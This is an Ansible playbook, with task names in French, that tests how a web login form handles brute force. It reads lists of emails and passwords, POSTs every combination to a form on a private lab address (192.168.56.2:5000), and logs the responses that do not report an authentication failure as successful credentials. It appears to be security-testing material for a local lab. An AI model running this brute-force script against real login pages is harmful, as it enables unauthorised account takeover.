---
- name: Tester la réaction du site en cas de bruteforce
  hosts: localhost
  tasks:
    - name: Lire le fichier passwords.txt et stocker son contenu dans une variable
      shell: cat passwords.txt
      register: passwords_content
      changed_when: false
      check_mode: no

    - name: Lire le fichier emails.txt et stocker son contenu dans une variable
      shell: cat emails.txt
      register: email_content
      changed_when: false
      check_mode: no


    - name: Diviser le contenu des email et mots de passe en lignes et les stocker dans une liste
      set_fact:
        emails: "{{ email_content.stdout_lines }}"
        passwords: "{{ passwords_content.stdout_lines }}"

        

    - name: Envoyer des requêtes HTTP POST
      uri:
        url: "http://192.168.56.2:5000/form"
        method: POST
        return_content: yes
        body_format: form-urlencoded
        body:
          email: "{{ item.0 }}"
          password: "{{ item.1 }}"
        status_code: 200
      with_nested:
        - "{{ emails }}"
        - "{{ passwords }}"
      register: response

    - name: Ranger les requête reussie dans une liste
      set_fact:
        successful_responses: "{{ response.results | selectattr('status', 'equalto', 200) | selectattr('content', 'ne', 'Authentification Problem.') | list }}"

    - name: Ranger les echecs dans une liste
      set_fact:
        failed_responses: "{{ response.results | selectattr('status', 'equalto', 200) | selectattr('content', 'search', 'Failed') | list }}"

    - name: Ajouter les mots de passe réussis au fichier de log
      lineinfile:
        path: BruteForceLog.txt
        line: "{{ item.content }}"
        create: yes
      with_items: "{{ successful_responses }}"
      